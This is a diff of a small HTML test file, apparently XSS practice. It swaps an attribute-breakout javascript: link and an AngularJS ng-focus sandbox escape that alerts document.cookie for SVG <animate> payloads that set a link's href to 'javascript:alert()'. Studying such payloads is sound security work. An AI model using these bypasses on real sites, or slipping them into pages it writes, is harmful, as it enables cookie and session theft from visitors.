@@ -1,15 +1,13 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
-  </head>
-  <body>
-    <a custom="' href='javascript:alert()">something</a>
+<svg>
+  <a>
+    <animate attributeName="href" values="javascript:alert()" />
+    <text x="20" y="20">Click me</text>
+  </a>
+</svg>
 
-    <input id=x
-    ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'/> <input
-    id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
-  </body>
-</html>
+<svg>
+  <a>
+    <animate attributeName="href" values="javascript:alert(1)" />
+    <text x="20" y="20">Click me</text>
+  </a>
+</svg>
